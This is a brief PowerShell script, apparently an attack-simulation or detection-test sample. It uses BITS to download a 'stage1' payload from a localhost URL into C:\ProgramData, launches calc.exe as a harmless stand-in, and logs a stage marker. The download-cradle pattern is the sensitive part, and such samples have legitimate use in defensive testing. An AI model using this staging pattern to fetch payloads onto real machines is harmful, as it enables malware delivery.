<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://localhost:8080/stage1.ps1',
    [string]$DownloadPath = 'C:\ProgramData\payload.bin',
    [int]$TimeoutSec = 34
)
try { Start-BitsTransfer -Source $PayloadUrl -Destination $DownloadPath; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 3; Write-Verbose "stage marker 13 reached" } catch { Write-Warning "Remote fetch failed" }
